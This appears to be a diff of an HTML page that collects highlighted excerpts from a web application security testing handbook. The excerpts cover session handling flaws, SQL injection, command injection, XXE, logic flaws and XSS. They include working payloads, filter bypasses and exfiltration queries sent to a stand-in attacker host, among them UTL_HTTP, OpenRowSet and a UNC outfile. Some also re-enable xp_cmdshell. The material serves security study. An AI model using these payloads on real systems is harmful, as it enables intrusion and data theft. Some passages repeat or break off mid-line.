+    <p>To harvest large numbers of tokens in an automated way, ideally identify a single request (typically either GET / or a login submission) that causes a new token to be issued.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/361/</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/363/</p>
+    <hr class="chill" />
+    <p>By registering a suitable range of usernames and reperforming this attack, you could potentially cycle through the entire range of valid uid values, and so masquerade as every user of the application.</p>
+    <hr class="chill" />
+    <p>One application observed by the authors contained a file upload/download function. Having uploaded a file, users were given a download link containing a filename parameter. To prevent various attacks that manipulate file paths, the application encrypted the filename within this parameter. However, if a user requested a file that had been deleted, the application displayed an error message showing the decrypted name of the requested file.</p>
+    <hr class="chill" />
+    <p>Some applications elect to use HTTPS to protect the user&#39;s credentials during login but then revert to HTTP for the remainder of the user&#39;s session. Many web mail applications behave in this way. In this situation, an eavesdropper cannot intercept the user&#39;s credentials but may still capture the session token.</p>
+    <hr class="chill" />
+    <p>Some applications use HTTP for preauthenticated areas of the site, such as the site&#39;s front page, but switch to HTTPS from the login page onward. However, in many cases the user is issued a session token at the first page visited, and this token is not modified when the user logs in. The user&#39;s session, which is originally unauthenticated, is upgraded to an authenticated session after login. In this situation an eavesdropper can intercept a user&#39;s token before login, wait for the user&#39;s communications to switch to HTTPS, indicating that the user is logging in, and then attempt to access a protected page (such as My Account) using that token.</p>
+    <hr class="chill" />
+    <p>As described previously, an attacker can intercept the user&#39;s session token when the user&#39;s browser accesses a resource over HTTP and use this token to access protected, nonstatic areas of the site over HTTPS.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/369/ http://mdsec.net/auth/372/ http://mdsec.net/auth/374/</p>
+    <hr class="chill" />
+    <p>When session tokens appear in URLs, these are transmitted in the Referer header when users follow an off-site link or their browser loads an off-site resource.</p>
+    <hr class="chill" />
+    <p>The final case just described presents an attacker with a highly effective means of capturing session tokens in some applications. For example, if a web mail application transmits session tokens within the URL, an attacker can send e-mails to users of the application containing a link to a web server he controls. If any user accesses the link (because she clicks it, or because her browser loads images contained within HTML-formatted e-mail), the attacker receives, in real time, the user&#39;s session token.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/379/</p>
+    <hr class="chill" />
+    <p>The simplest weakness is to allow multiple valid tokens to be concurrently assigned to the same user account. In virtually every application, there is no legitimate reason why any user should have more than one session active at one time.</p>
+    <hr class="chill" />
+    <p>Log in to the application twice using the same user account, either from different browser processes or from different computers. Determine whether both sessions remain active concurrently. If so, the application supports concurrent sessions, enabling an attacker who has compromised another user&#39;s credentials to make use of these without risk of detection.</p>
+    <hr class="chill" />
+    <p>Log in and log out several times using the same user account, either from different browser processes or from different computers. Determine whether a new session token is issued each time or whether the same token is issued each time you log in. If the latter occurs, the application is not really employing proper sessions.</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/382/ http://mdsec.net/auth/385/</p>
+    <hr class="chill" />
+    <p>In some cases, a logout function is simply not implemented. Users have no means of causing the application to invalidate their session.</p>
+    <hr class="chill" />
+    <p>In some cases, the logout function does not actually cause the server to invalidate the session. The server removes the token from the user&#39;s browser (for example, by issuing a Set-Cookie instruction to blank the token). However, if the user continues to submit the token, the server still accepts it.</p>
+    <hr class="chill" />
+    <p>Do not fall into the trap of examining actions that the application performs on the client-side token (such as cookie invalidation via a new Set-Cookie instruction, client-side script, or an expiration time attribute). In terms of session termination, nothing much depends on what happens to the token within the client browser. Rather, investigate whether session expiration is implemented on the server side:</p>
+    <hr class="chill" />
+    <p>Where a logout function is provided, test its effectiveness. After logging out, attempt to reuse the old token and determine whether it is still valid. If so, users remain vulnerable to some session hijacking attacks even after they have “logged out.”</p>
+    <hr class="chill" />
+    <p>Try It! http://mdsec.net/auth/423/ http://mdsec.net/auth/439/ http://mdsec.net/auth/447/ http://mdsec.net/auth/452/ http://mdsec.net/auth/457/</p>
+    <hr class="chill" />
+    <p>If the application issues session tokens to unauthenticated users, obtain a token and perform a login. If the application does not issue a fresh token following a successful login, it is vulnerable to session fixation.</p>
+    <hr class="chill" />
+    <p>Identify the format of session tokens used by the application. Modify your token to an invented value that is validly formed, and attempt to log in. If the application allows you to create an authenticated session using an invented token, it is vulnerable to session fixation.</p>
+    <hr class="chill" />
+    <p>Review all the cookies issued by the application, and check for any domain attributes used to control the scope of the cookies. 1. If an application explicitly liberalizes its cookies&#39; scope to a parent domain, it may be leaving itself vulnerable to attacks via other web applications.</p>
+    <hr class="chill" />
+    <p>A highly effective formula for incorporating this entropy is to construct a string that concatenates a pseudorandom number, a variety of request-specific data as listed, and a secret string known only to the server and generated afresh on each reboot.</p>
+    <hr class="chill" />
+    <p>(Placing the most variable items toward the start of the hash&#39;s input maximizes the “avalanche” effect within the hashing algorithm.)</p>
+    <hr class="chill" />
+    <p>Cookies with overly liberal scope are often generated by poorly configured web application platforms or web servers, rather than by the application developers themselves.</p>
+    <hr class="chill" />
+    <p>According to specifications, servers should respond to a HEAD request with the same headers they would use to respond to the corresponding GET request, but with no message body. Hence, most platforms correctly service HEAD requests by executing the corresponding GET handler and just return the HTTP headers that are generated.</p>
+    <hr class="chill" />
+    <p>Are there any identifiers (by way of URL parameters of POST body message) that signal a parameter is being used to track access levels?</p>
+    <hr class="chill" />
+    <p>enumerate and gain direct access to sensitive functionality. 2. Where application pages are identified that are likely to present different functionality or links to ordinary and administrative users (for example, Control Panel or My Home Page), try adding parameters such as admin=true to the URL query string and the body of POST requests. This will help you determine whether this uncovers or gives access to any additional functionality than your user context has normal access to.</p>
+    <hr class="chill" />
+    <p>Where application pages are identified that are likely to present different functionality or links to ordinary and administrative users (for example, Control Panel or My Home Page), try adding parameters such as admin=true to the URL query string and the body of POST requests. This will help you determine whether this uncovers or gives access to any additional functionality than your user context has normal access to.</p>
+    <hr class="chill" />
+    <p>Test whether the application uses the Referer header as the basis for making access control decisions. For key application functions that you are authorized to access, try removing or modifying the Referer header, and determine whether your request is still successful</p>
+    <hr class="chill" />
+    <p>When you are probing for SQL injection vulnerabilities, be sure to walk through to completion any multistage processes in which you submit crafted input. Applications frequently gather a collection of data across several requests, and they persist this to the database only after the complete set has been gathered. In this situation, you will miss many SQL injection vulnerabilities if you only submit crafted data within each individual request and monitor the application&#39;s response to that request.</p>
+    <hr class="chill" />
+    <p>Submit a single quotation mark as the item of data you are targeting. Observe whether an error occurs, or whether the result differs from the original in any other way. If a detailed database error message is received, consult the “SQL Syntax and Error Reference” section of this chapter to understand its meaning. 2. If an error or other divergent behavior was observed, submit two single quotation marks together. Databases use two single quotation marks as an escape sequence to represent a literal single quote, so the sequence is interpreted as data within the quoted string rather than the closing string terminator. If this input causes the error or anomalous behavior to disappear, the application is probably vulnerable to SQL injection.</p>
+    <hr class="chill" />
+    <p>Try supplying a simple mathematical expression that is equivalent to the original numeric value. For example, if the original value is 2, try submitting 1 + 1 or 3-1. If the application responds in the same way, it may be vulnerable. 2. The preceding test is most reliable in cases where you have confirmed that the item being modified has a noticeable effect on the application&#39;s behavior. For example, if the application uses a numeric PageID parameter to specify which content should be returned, substituting 1 + 1 for 2 with equivalent results is a good sign that SQL injection is present.</p>
+    <hr class="chill" />
+    <p>A good example of this is the ASCII command, which returns the numeric ASCII code of the supplied character. For example, because the ASCII value of A is 65, the following expression is equivalent to 2 in SQL: 67-ASCII(‘A’) 4. The preceding test will not work if single quotes are being filtered. However, in this situation you can exploit the fact that databases implicitly convert numeric data to string data where required. Hence, because the ASCII value of the character 1 is 49, the following expression is equivalent to 2 in SQL: 51-ASCII(1)</p>
+    <hr class="chill" />
+    <p>&amp; and = are used to join name/value pairs to create the query string and the block of POST data. You should encode them using %26 and %3d, respectively. Literal spaces are not allowed in the query string. If they are submitted, they will effectively terminate the entire string. You should encode them using + or %20. Because + is used to encode spaces, if you want to include an actual + in your string, you must encode it using %2b. In the previous numeric example, therefore, 1+1 should be submitted as 1%2b1. The semicolon is used to separate cookie fields and should be encoded using %3b.</p>
+    <hr class="chill" />
+    <p>When the same results are obtained, you have probably identified the type of database being used. The following examples show how the string services could be constructed on the common types of database: Oracle: ‘serv’||‘ices’ MS-SQL: ‘serv’+‘ices’ MySQL: ‘serv’ ‘ices’ (note the space)</p>
+    <hr class="chill" />
+    <p>Oracle: BITAND(1,1)-BITAND(1,1) MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED MySQL: CONNECTION_ID()-CONNECTION_ID()</p>
+    <hr class="chill" />
+    <p>An attacker also can use this facility to fingerprint the exact version of the database. For example, injecting the following string causes the WHERE clause of a SELECT statement to be false if the MySQL version in use is greater than or equal to 3.23.02: /*!32302 and 1=0*/</p>
+    <hr class="chill" />
+    <p>if there are three columns, and the first column can take string data, you can extract the database version by injecting the following query on MS-SQL and MySQL: ’ UNION SELECT @@version,NULL,NULL-- Injecting the following query achieves the same result on Oracle: ’ UNION SELECT banner,NULL,NULL FROM v$version--</p>
+    <hr class="chill" />
+    <p>If the comment symbol is blocked, you can often craft your injected data such that it does not break the syntax of the surrounding query, even without using this. For example, instead of injecting: ’ or 1=1-- you can inject: ’ or ‘a’=’a</p>
+    <hr class="chill" />
+    <p>Some input validation routines employ a simple blacklist and either block or remove any supplied data that appears on this list. In this instance, you should try the standard attacks, looking for common defects in validation and canonicalization mechanisms, as described in Chapter 2. For example, if the SELECT keyword is being blocked or removed, you can try the following bypasses: SeLeCt %00SELECT SELSELECTECT %53%45%4c%45%43%54 %2553%2545%254c%2545%2543%2554</p>
+    <hr class="chill" />
+    <p>If the application blocks or strips spaces from your input, you can use comments to simulate whitespace within your injected data. For example: SELECT/*foo*/username,password/*foo*/FROM/*foo*/users In MySQL, comments can even be inserted within keywords themselves, which provides another means of bypassing some input validation filters while preserving the syntax of the actual query. For example: SEL/*foo*/ECT username,password FR/*foo*/OM users</p>
+    <hr class="chill" />
+    <p>In some applications, input from the user is validated on arrival by escaping a single quote. In the original book search example, this approach appears to be effective. When the user enters the search term O&#39;Reilly, the application makes the following query: SELECT author,title,year FROM books WHERE publisher = ‘O’‘Reilly’ Here, the single quotation mark supplied by the user has been converted into two single quotation marks. Therefore, the item passed to the database has the same literal significance as the original expression the user entered.</p>
+    <hr class="chill" />
+    <p>These functions can be used together to extract a single character from a string in numeric form. For example: SUBSTRING(‘Admin’,1,1) returns A. ASCII(‘A’) returns 65. Therefore: ASCII(SUBSTR(‘Admin’,1,1)) returns 65. Using these two functions, you can systematically cut a string of useful data into its individual characters and return each of these separately, in numeric form. In a scripted attack, this technique can be used to quickly retrieve and reconstruct a large amount of string-based data one byte at a time.</p>
+    <hr class="chill" />
+    <p>On older databases such as MS-SQL 2000 and earlier, the OpenRowSet command can be used to open a connection to an external database and insert arbitrary data into it. For example, the following query causes the target database to open a connection to the attacker&#39;s database and insert the version string of the target database into the table called foo: insert into openrowset(‘SQLOLEDB’, &#39;DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein&#39;, &#39;select * from foo&#39;) values (@@version) Note that you can specify port 80, or any other likely value, to increase your chance of making an outbound connection through any firewalls.</p>
+    <hr class="chill" />
+    <p>Oracle contains a large amount of default functionality that is accessible by low-privileged users and that can be used to create an out-of-band connection. The UTL_HTTP package can be used to make arbitrary HTTP requests to other hosts. UTL_HTTP contains rich functionality and supports proxy servers, cookies, redirects, and authentication. This means that an attacker who has compromised a database on a highly restricted internal corporate network may be able to leverage a corporate proxy to initiate outbound connections to the Internet. In the following example, UTL_HTTP is used to transmit the results of an injected query to a server controlled by the attacker: /employees.asp?EmpNo=7521&#39;||UTL_HTTP.request(&#39;mdattacker.net:80/&#39;|| (SELECT%20username%</p>
+    <hr class="chill" />
+    <p>Oracle contains a large amount of default functionality that is accessible by low-privileged users and that can be used to create an out-of-band connection. The UTL_HTTP package can be used to make arbitrary HTTP requests to other hosts. UTL_HTTP contains rich functionality and supports proxy servers, cookies, redirects, and authentication. This means that an attacker who has compromised a database on a highly restricted internal corporate network may be able to leverage a corporate proxy to initiate outbound connections to the Internet. In the following example, UTL_HTTP is used to transmit the results of an injected query to a server controlled by the attacker: /employees.asp?EmpNo=7521&#39;||UTL_HTTP.request(&#39;mdattacker.net:80/&#39;|| (SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--</p>
+    <hr class="chill" />
+    <p>The UTL_INADDR package is designed to be used to resolve hostnames to IP addresses. It can be used to generate arbitrary DNS queries to a server controlled by the attacker. In many situations, this is more likely to succeed than the UTL_HTTP attack, because DNS traffic is often allowed out through corporate firewalls even when HTTP traffic is restricted. The attacker can leverage this package to perform a lookup on a hostname of his choice, effectively retrieving arbitrary data by prepending it as a subdomain to a domain name he controls.</p>
+    <hr class="chill" />
+    <p>On Oracle 11g, an additional ACL protects many of the resources just described from execution by any arbitrary database user. An easy way around this is to dip into the new functionality provided in Oracle 11g and use this code: SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE  NAME=‘SYS’)||&#39;.mdsec.net&#39;,80)</p>
+    <hr class="chill" />
+    <p>MySQL The SELECT ... INTO OUTFILE command can be used to direct the output from an arbitrary query into a file. The specified filename may contain a UNC path, enabling you to direct the output to a file on your own computer. For example: select * into outfile ‘\\\\mdattacker.net\\share\\output.txt’ from users; To receive the file, you need to create an SMB share on your computer that allows anonymous write access.</p>
+    <hr class="chill" />
+    <p>Suppose that you have not identified any method of transmitting the results of your injected queries back to the browser. Nevertheless, you have already seen how you can use SQL injection to modify the application&#39;s behavior. For example, submitting the following two pieces of input causes very different results: admin&#39; AND 1=1-- admin&#39; AND 1=2-- In the first case, the application logs you in as the admin user. In the second case, the login attempt fails, because the 1=2 condition is always false. You can leverage this control of the application&#39;s behavior as a means of inferring the truth or falsehood of arbitrary conditions within the database itself.</p>
+    <hr class="chill" />
+    <p>SELECT X FROM Y WHERE C This causes the database to work through each row of table Y, evaluating condition C, and returning X in those cases where condition C is true. If condition C is never true, the expression X is never evaluated.</p>
+    <hr class="chill" />
+    <p>SELECT X FROM Y WHERE C This causes the database to work through each row of table Y, evaluating condition C, and returning X in those cases where condition C is true. If condition C is never true, the expression X is never evaluated. This behavior can be exploited by finding an expression X that is syntactically valid but that generates an error if it is ever evaluated. An example of such an expression in Oracle and MS-SQL is a divide-by-zero computation, such as 1/0. If condition C is ever true, expression X is evaluated, causing a database error. If condition C is always false, no error is generated. You can, therefore, use the presence or absence of an error to test an arbitrary condition C.</p>
+    <hr class="chill" />
+    <p>The precise means of inducing a suitable time delay depends on the target database being used. MS-SQL contains a built-in WAITFOR command, which can be used to cause a specified time delay. For example, the following query causes a time delay of 5 seconds if the current database user is sa: if (select user) = ‘sa’ waitfor delay ‘0:0:5’</p>
+    <hr class="chill" />
+    <p>In current versions of MySQL, the sleep function can be used to create a time delay for a specified number of milliseconds: select if(user() like ‘root@%’, sleep(5000), ‘false’)</p>
+    <hr class="chill" />
+    <p>Oracle has no built-in method to perform a time delay, but you can use other tricks to cause a time delay to occur. One trick is to use UTL_HTTP to connect to a nonexistent server, causing a timeout.</p>
+    <hr class="chill" />
+    <p>In both Oracle and MySQL databases, you can use the SUBSTR(ING)and ASCII functions to retrieve arbitrary information one byte at a time, as described previously.</p>
+    <hr class="chill" />
+    <p>For further reading on this highly fruitful area of current research, we recommend The Database Hacker&#39;s Handbook (Wiley, 2005).</p>
+    <hr class="chill" />
+    <p>MS-SQL Perhaps the most notorious piece of database functionality that an attacker can misuse is the xp_cmdshell stored procedure, which is built into MS-SQL by default. This stored procedure allows users with DBA permissions to execute operating system commands in the same way as the cmd.exe command prompt. For example: master..xp_cmdshell ‘ipconfig &gt; foo.txt’</p>
+    <hr class="chill" />
+    <p>Because MS-SQL runs by default as LocalSystem, the attacker typically can fully compromise the underlying operating system, performing arbitrary actions. MS-SQL contains a wealth of other extended stored procedures, such as xp_regread and xp_regwrite, that can be used to perform powerful actions within the registry of the Windows operating system.</p>
+    <hr class="chill" />
+    <p>Most installations of MS-SQL encountered on the Internet will be MS-SQL 2005 or later. These versions contain numerous security features that lock down the database by default, preventing many useful attack techniques from working. However, if the web application&#39;s user account within the database is sufficiently high-privileged, it is possible to overcome these obstacles simply by reconfiguring the database. For example, if xp_cmdshell is disabled, it can be re-enabled with the sp_configure stored procedure. The following four lines of SQL do this: EXECUTE sp_configure ‘show advanced options’, 1 RECONFIGURE WITH OVERRIDE EXECUTE sp_configure ‘xp_cmdshell’, ‘1’ RECONFIGURE WITH OVERRIDE At this point, xp_cmdshell is re-enabled</p>
+    <hr class="chill" />
+    <p>MySQL Compared to the other databases covered, MySQL contains relatively little built-in functionality that an attacker can misuse. One example is the ability of any user with the FILE_PRIV permission to read and write to the filesystem. The LOAD_FILE command can be used to retrieve the contents of any file. For example: select load_file(&#39;/etc/passwd&#39;)</p>
+    <hr class="chill" />
+    <p>Because MySQL stores its data in plaintext files, to which the database must have read access, an attacker with FILE_PRIV permissions can simply open the relevant file and read arbitrary data from within the database, bypassing any access controls enforced within the database itself.</p>
+    <hr class="chill" />
+    <p>An attacker can use the preceding method to create an arbitrary binary file within this path and then create a UDF that uses it. Refer to Chris Anley&#39;s paper “Hackproofing MySQL” for more details on this technique.</p>
+    <hr class="chill" />
+    <p>Many of the techniques we have described for exploiting SQL injection vulnerabilities involve performing large numbers of requests to extract small amounts of data at a time. Fortunately, numerous tools are available that automate much of this process and that are aware of the database</p>
+    <hr class="chill" />
+    <p>Many of the techniques we have described for exploiting SQL injection vulnerabilities involve performing large numbers of requests to extract small amounts of data at a time. Fortunately, numerous tools are available that automate much of this process and that are aware of the database-specific syntax required to deliver successful attacks.</p>
+    <hr class="chill" />
+    <p>Numerous tools exist for automated exploitation of SQL injection. Many of these are specifically geared toward MS-SQL, and many have ceased active development and have been overtaken by new techniques and developments in SQL injection. The authors&#39; favorite is sqlmap, which can attack MySQL, Oracle, and MS-SQL, among others.</p>
+    <hr class="chill" />
+    <p>One of the best ways to use it is with the --sql-shell option. This gives the attacker a SQL prompt and performs the necessary UNION, error-based, or blind SQL injection behind the scenes to send and retrieve results.</p>
+    <hr class="chill" />
+    <p>The authors have encountered many applications where the developers made a judgment in each case about whether to use a parameterized query. In cases where user-supplied input was clearly being used, they did so; otherwise, they didn&#39;t bother. This approach has been the cause of many SQL injection flaws.</p>
+    <hr class="chill" />
+    <p>Every item of data inserted into the query should be properly parameterized. The authors have encountered numerous cases where most of a query&#39;s parameters are handled safely, but one or two items are concatenated directly into the string used to specify the query structure. The use of parameterized queries will not prevent SQL injection if some parameters are handled in this way.</p>
+    <hr class="chill" />
+    <p>Parameter placeholders cannot be used for any other parts of the query, such as the ASC or DESC keywords that appear within an ORDER BY clause, or any other SQL keyword, since these form part of the query structure.</p>
+    <hr class="chill" />
+    <p>You are most likely to encounter LDAP being used in corporate intranet-based web applications, such as an HR application that allows users to view and modify information about employees.</p>
+    <hr class="chill" />
+    <p>the following all-purpose test string should induce a 30-second time delay on either platform if no filtering is in place: || ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &amp;</p>
+    <hr class="chill" />
+    <p>Many command injection attacks require you to inject spaces to separate command-line arguments. If you find that spaces are being filtered by the application, and the platform you are attacking is UNIX-based, you may be able to use the $IFS environment variable instead, which contains the whitespace field separators.</p>
+    <hr class="chill" />
+    <p>If you find a path traversal vulnerability that grants write access, your main goal should be to exploit this to achieve arbitrary execution of commands on the server. Here are some ways to exploit this vulnerability:  Create scripts in users&#39; startup folders. Modify files such as in.ftpd to execute arbitrary commands when a user next connects. Write scripts to a web directory with execute permissions, and call them from your browser.</p>
+    <hr class="chill" />
+    <p>After performing all relevant decoding and canonicalization of the user-submitted filename, the application should check whether it contains either of the path traversal sequences (using backslashes or forward slashes) or any null bytes. If so, the application should stop processing the request. It should not attempt to perform any sanitization on the malicious filename.</p>
+    <hr class="chill" />
+    <p>In Java, this can be achieved by instantiating a java.io.File object using the user-supplied filename and then calling the getCanonicalPath method on this object. If the string returned by this method does not begin with the name of the start directory, the user has somehow bypassed the application&#39;s input filters, and the request should be rejected.</p>
+    <hr class="chill" />
+    <p>To test for remote file inclusion flaws, follow these steps: 1. Submit in each targeted parameter a URL for a resource on a web server that you control, and determine whether any requests are received from the server hosting the target application. 2. If the first test fails, try submitting a URL containing a nonexistent IP address, and determine whether a timeout occurs while the server attempts to connect.</p>
+    <hr class="chill" />
+    <p>When you encounter this type of functionality, you should always check for XML external entity (XXE) injection</p>
+    <hr class="chill" />
+    <p>In the preceding example, the attacker can submit the following request, which defines an XML external entity that references a file on the server&#39;s filesystem: POST /search/128/AjaxSearch.ashx HTTP/1.1 Host: mdsec.net Content-Type: text/xml; charset=UTF-8 Content-Length: 115 &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///windows/win.ini&quot; &gt; ]&gt; &lt;Search&gt;&lt;SearchTerm&gt;&amp;xxe;&lt;/SearchTerm&gt;&lt;/Search&gt;</p>
+    <hr class="chill" />
+    <p>Finally, if the application retrieves the external entity but does not return this in responses, it may still be possible to cause a denial of service by reading a file stream indefinitely. For example: &lt;!DOCTYPE foo</p>
+    <hr class="chill" />
+    <p>Finally, if the application retrieves the external entity but does not return this in responses, it may still be possible to cause a denial of service by reading a file stream indefinitely. For example: &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot; file:///dev/random&quot;&gt; ]&gt;</p>
+    <hr class="chill" />
+    <p>Submit a rogue XML closing tag such as &lt;/foo&gt; in each parameter in turn. If no error occurs, your input is probably not being inserted into a SOAP message, or it is being sanitized in some way.</p>
+    <hr class="chill" />
+    <p>If the HTTP request contains several parameters that may be being placed into a SOAP message, try inserting the opening comment character (&lt;!--) into one parameter and the closing comment character (!--&gt;) into another parameter. Then switch these around (because you have no way of knowing in which order the parameters appear). Doing so can have the effect of commenting out a portion of the server&#39;s SOAP message. This may cause a change in the application&#39;s logic or result in a different error condition that may divulge information.</p>
+    <hr class="chill" />
+    <p>Target each request parameter in turn, and try to append a new injected parameter using various syntax:  %26foo%3dbar — URL-encoded &amp;foo=bar %3bfoo%3dbar — URL-encoded ;foo=bar %2526foo%253dbar — Double URL-encoded &amp;foo=bar</p>
+    <hr class="chill" />
+    <p>Here, users can specify a From address and the contents of the message. The application passes this input to the PHP mail() command, which constructs the e-mail and performs the necessary SMTP conversation with its configured mail server.</p>
+    <hr class="chill" />
+    <p>Writing code in a programming language involves at its root nothing more than breaking a complex process into simple and discrete logical steps.</p>
+    <hr class="chill" />
+    <p>Translating a piece of functionality that is meaningful to human beings into a sequence of small operations that can be executed by a computer involves a great deal of skill and discretion. Doing so in an elegant and secure fashion is harder still.</p>
+    <hr class="chill" />
+    <p>When probing key functionality for logic flaws, try removing in turn each parameter submitted in requests, including cookies, query string fields, and items of POST data. 2. Be sure to delete the actual name of the parameter as well as its value. Do not just submit an empty string, because typically the server handles this differently. 3. Attack only one parameter at a time to ensure that all relevant code paths within the application are reached. 4. If the request you are manipulating is part of a multistage process, follow the process through to completion, because some later logic may process data that was supplied in earlier steps and stored within the session.</p>
+    <hr class="chill" />
+    <p>An attacker could exploit the shared component to bypass all server-side input validation. At each stage of the quotation process, the application performed strict validation of the data expected at that stage and rejected any data that failed this validation. But the shared component updated the application&#39;s state with every parameter supplied by the user. Hence, if an attacker submitted data out of sequence by supplying a name/value pair that the application expected at an earlier stage, that data would be accepted and processed, with no validation having been performed.</p>
+    <hr class="chill" />
+    <p>Whenever an application implements a key action across multiple stages, you should take parameters that are submitted at one stage of the process and try submitting these to a different stage. If the relevant items of data are updated within the application&#39;s state, you should explore the ramifications of this behavior to determine whether you can leverage it to carry out any malicious action, as in the preceding three examples.</p>
+    <hr class="chill" />
+    <p>If the application implements functionality whereby different categories of user can update or perform other actions on a common collection of data, you should walk through the process using each type of user and observe the parameters submitted. Where different parameters are ordinarily submitted by the different users, take each parameter submitted by one user and try to submit it as the other user. If the parameter is accepted and processed as that user, explore the implications of this behavior as previously described.</p>
+    <hr class="chill" />
+    <p>To exploit the logic flaw, therefore, an attacker needed to follow these steps: Log in to the application using his own valid account credentials. Using the resulting authenticated session, access the registration functionality and submit a different customer&#39;s personal information. This caused the application to overwrite the original CCustomer object in the attacker&#39;s session with a new object relating to the targeted customer. Return to the main application functionality and access the other customer&#39;s account.</p>
+    <hr class="chill" />
+    <p>In a complex application involving either horizontal or vertical privilege segregation, try to locate any instances where an individual user can accumulate an amount of state within his session that relates in some way to his identity. 2. Try to step through one area of functionality, and then switch to an unrelated area, to determine whether any accumulated state information has an effect on the application&#39;s behavior.</p>
+    <hr class="chill" />
+    <p>The developers&#39; assumption was flawed because they overlooked the possibility that a user would attempt to process a transfer for a negative amount. Any negative number would clear the approval test, because it is less than the threshold. However, the banking module of the application accepted negative transfers and simply processed them as positive transfers in the opposite direction. Hence, any user who wanted to transfer $20,000 from account A to account B could simply initiate a transfer of –$20,000 from account B to account A, which had the same effect and required no approval. The antifraud defenses built into the application could be bypassed easily!</p>
+    <hr class="chill" />
+    <p>You can test for this type of vulnerability without knowing exactly what length limit is being imposed by submitting in turn two long strings of the following form: &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&quot; and so on a&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&quot; and so on and determining whether an error occurs. Any truncation of escaped input will occur after either an even or odd number of characters. Whichever possibility is the case, one of the preceding strings will result in an odd number of single quotation marks being inserted into the query, resulting in invalid syntax.</p>
+    <hr class="chill" />
+    <p>Cross-site scripting filters frequently inadvisably strip all data that occurs between HTML tag pairs, such as &lt;tag1&gt;aaaaa&lt;/tag1&gt;. These are often vulnerable to this type of attack.</p>
+    <hr class="chill" />
+    <p>Although the user cannot view the document itself, with sufficient imagination and use of scripted requests, he may be able to build a fairly accurate understanding of its contents.</p>
+    <hr class="chill" />
+    <p>Because many banner ad providers charge on a per-click basis, this technique effectively enables an attacker to “buy” a specific number of user sessions.</p>
+    <hr class="chill" />
+    <p>In-band delivery applies in most cases and is used when the data that is the subject of the vulnerability is supplied to the application via its main web interface. Common locations where user-controllable data may eventually be displayed to other users include the following: Personal information fields — name, address, e-mail, telephone, and the like Names of documents, uploaded files, and other items Feedback or questions for application administrators Messages, status updates, comments, questions, and the like for other application users Anything that is recorded in application logs and displayed in-browser to administrators, such as URLs, usernames, HTTP Referer, User-Agent, and the like The contents of uploaded files that are shared between users</p>
+    <hr class="chill" />
+    <p>Always assume that an attacker will be more imaginative than you in devising ways to exploit minor bugs!</p>
+    <hr class="chill" />
+    <p>A basic approach to identifying XSS vulnerabilities is to use a standard proof-of-concept attack string such as the following: &quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; This string is submitted as every parameter to every page of the application, and responses are monitored for the appearance of this same string. If cases are found where the attack string appears unmodified within the response, the application is almost certainly vulnerable to XSS.</p>
+    <hr class="chill" />
+    <p>Choose a unique arbitrary string that does not appear anywhere within the application and that contains only alphabetical characters and therefore is unlikely to be affected by any XSS-specific filters. For example: myxsstestdmqlwp Submit this string as every parameter to every page, targeting only one parameter at a time. 2. Monitor the application&#39;s responses for any appearance of this same string. Make a note of every parameter whose value is being copied into the application&#39;s response. These are not necessarily vulnerable, but each instance identified is a candidate for further investigation, as described in the next section. 3. Note that both GET and POST requests need to be tested. You should include every parameter within both the URL query string and the message body. Although a smaller range of delivery mechanisms exists for XSS vulnerabilities that can be triggered only by a POST request, exploitation is still possible, as previously described. 4. In any cases where XSS was found in a POST request, use the “change request method” option in Burp to determine whether the same attack could be performed as a GET request. 5. In addition to the standard request parameters, you should test every instance in which the application processes the contents of an HTTP request header. A common XSS vulnerability arises in error messages, where items such as the Referer and User-Agent headers are copied into the message&#39;s contents. These headers are valid vehicles for delivering a reflected XSS attack, because an attacker can use a Flash object to induce a victim to issue a request containing arbitrary HTTP headers.</p>
+    <hr class="chill" />
+    <p>Event Handlers Numerous event handlers can be used with various tags to cause a script to execute. The following are some little-known examples that execute script without requiring any user interaction: &lt;xml onreadystatechange=alert(1)&gt; &lt;style onreadystatechange=alert(1)&gt; &lt;iframe onreadystatechange=alert(1)&gt; &lt;object onerror=alert(1)&gt; &lt;object type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;/object&gt; &lt;img type=image src=valid.gif onreadystatechange=alert(1)&gt; &lt;input type=image src=valid.gif onreadystatechange=alert(1)&gt; &lt;isindex type=image src=valid.gif onreadystatechange=alert(1)&gt; &lt;script onreadystatechange=alert(1)&gt; &lt;bgsound onpropertychange=alert(1)&gt; &lt;body onbeforeactivate=alert(1)&gt; &lt;body onactivate=alert(1)&gt; &lt;body onfocusin=alert(1)&gt;</p>
+    <hr class="chill" />
+    <p>The new event-source tag is of particular interest when targeting input filters. Unlike any pre-HTML5 tags, its name includes a hyphen, so using this tag may bypass legacy regex-based filters that assume tag names can contain only letters.</p>
+    <hr class="chill" />
+    <p>&lt;event-source src=javascript:alert(1)&gt;</p>
+    <hr class="chill" />
+    <p>Starting with the opening tag name, the most simple and naïve filters can be bypassed simply by varying the case of the characters used: &lt;iMg onerror=alert(1) src=a&gt; Going further, you can insert NULL bytes at any position: &lt;[%00]img onerror=alert(1) src=a&gt; &lt;i[%00]mg onerror=alert(1) src=a&gt;</p>
+    <hr class="chill" />
